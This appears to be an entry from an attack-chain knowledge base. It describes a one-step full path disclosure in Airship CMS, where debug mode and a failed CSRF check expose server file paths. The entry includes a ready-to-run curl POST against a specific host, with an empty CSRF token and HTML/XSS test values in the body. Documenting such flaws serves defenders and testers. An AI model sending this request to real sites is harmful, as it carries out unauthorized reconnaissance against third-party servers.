---
id: 11fd1bf7-b8cb-44db-b1a8-9a5e1cf8e207
name: Full Path Disclosure via CSRF Validation Failure in Airship CMS
type: attack_chain
description: >-
  Exploit debug mode in Airship CMS to trigger CSRF validation failure and
  disclose full server file paths for reconnaissance.
verified: false
submitted: true
step_count: 1
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:03.583Z'
procedures:
  - '[[procedures/Trigger-Full-Path-Disclosure-via-CSRF-Failure]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
tactics:
  - '[[Reconnaissance]]'
tags:
  - information-disclosure
  - csrf
  - path-disclosure
  - airship-cms
  - php
platforms:
  - Web
  - PHP
tools: []
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Full Path Disclosure via CSRF Validation Failure in Airship CMS

Multi-stage attack chain demonstrating a complete attack workflow.

The vulnerability in Airship CMS allows attackers to disclose full server file paths by triggering a CSRF validation failure when the application is running in debug mode. This occurs when submitting a POST request to the author edit endpoint without a valid CSRF token, causing detailed exception messages to reveal sensitive file system information. This reconnaissance can aid in identifying scripts, configurations, and paths for further exploitation.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Trigger CSRF Failure] --> B[Path Disclosure]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-post-csrf-failure]]

### Target Environment

- Web platform running Airship CMS in debug mode
- PHP-based application
- Access to author edit endpoint (e.g., /author/edit/{id})

### Initial Access Requirements

- Network access to the target web application
- No authentication required for the endpoint if publicly accessible
- Prior knowledge of the CMS version and debug configuration

## Detailed Attack Procedures

### Step 1: Trigger CSRF Validation Failure

procedure: [[procedures/Trigger-Full-Path-Disclosure-via-CSRF-Failure]]

**Objective**: Submit an invalid POST request to the author edit endpoint to bypass CSRF validation and expose full file paths in the error response.

**Instructions**: Use [[commands/curl-post-csrf-failure]] to send a POST request without a valid CSRF token:

```bash
curl -X POST https://bridge.cspr.ng/author/edit/7 \
  -H "Host: bridge.cspr.ng" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Referer: https://bridge.cspr.ng/author/edit/7" \
  -H "Cookie: __cfduid=any; PHPSESSID=any; cf_clearance=any-any-any" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_CSRF_TOKEN=&name=%3Cxss%3E&byline=&format=Rich+Text&biography=%3Ch2%3Exxxxxx%3Cbr%3E%3C%2Fh2%3E&_wysihtml5_mode=1&save_btn=sav"
```

**Expected Output**: An error response containing detailed exception information, including full server file paths like "/var/www/html/path/to/script.php".

**Success Indicators**:
- Response includes stack trace with absolute file paths
- Disclosure of server filesystem structure, such as locations of PHP scripts or configuration files

## Attack Chain Summary

### Key Achievements

1. Successful trigger of CSRF validation failure in debug mode
2. Disclosure of full server file paths for reconnaissance
3. Identification of potential entry points for further exploits based on revealed paths

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Reconnaissance]]

---
*Last updated: 2023-10-01T00:00:00Z*
